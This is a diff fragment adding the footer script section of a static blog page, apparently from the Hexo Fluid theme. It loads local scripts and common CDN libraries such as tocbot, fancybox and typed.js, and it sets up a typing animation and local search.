+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
